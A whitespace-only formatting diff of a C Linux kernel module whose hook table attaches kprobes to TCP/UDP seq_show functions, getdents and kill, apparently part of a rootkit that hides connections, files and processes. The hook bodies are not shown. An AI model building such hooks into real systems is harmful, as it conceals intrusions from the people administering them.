@@ -5,19 +5,19 @@
 #include <linux/module.h>
 
 struct hook {
-  void *func;  // hook function
-  struct kprobe kp; // kprobe hook
+  void         *func; // hook function
+  struct kprobe kp;   // kprobe hook
 };
 
 struct hook hooks[] = {
-    {.func = h_tcp4_seq_show, .kp = {.symbol_name = "tcp4_seq_show"}},
-    {.func = h_tcp6_seq_show, .kp = {.symbol_name = "tcp6_seq_show"}},
+    {.func = h_tcp4_seq_show, .kp = {.symbol_name = "tcp4_seq_show"}     },
+    {.func = h_tcp6_seq_show, .kp = {.symbol_name = "tcp6_seq_show"}     },
 
-    {.func = h_udp4_seq_show, .kp = {.symbol_name = "udp4_seq_show"}},
-    {.func = h_udp6_seq_show, .kp = {.symbol_name = "udp6_seq_show"}},
+    {.func = h_udp4_seq_show, .kp = {.symbol_name = "udp4_seq_show"}     },
+    {.func = h_udp6_seq_show, .kp = {.symbol_name = "udp6_seq_show"}     },
 
-    {.func = h_getdents, .kp = {.symbol_name = "__x64_sys_getdents"}},
-    {.func = h_kill, .kp = {.symbol_name = "__x64_sys_kill"}},
+    {.func = h_getdents,      .kp = {.symbol_name = "__x64_sys_getdents"}},
+    {.func = h_kill,          .kp = {.symbol_name = "__x64_sys_kill"}    },
     /*{.num = __NR_openat, .name = "openat", .func = h_openat},
     {.num = __NR_statx, .name = "statx", .func = h_statx},
     {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
@@ -84,11 +84,11 @@ int __hook_pre_handler(struct kprobe *kp, struct pt_regs *r) {
 
 bool hooks_install(void) {
   struct hook *h = NULL;
-  uint8_t i = 0;
+  uint8_t      i = 0;
 
   // register all the hooks
   for (; i < hook_count(); i++) {
-    h = &hooks[i];
+    h                 = &hooks[i];
     h->kp.pre_handler = __hook_pre_handler;
 
     if (register_kprobe(&h->kp) != 0) {
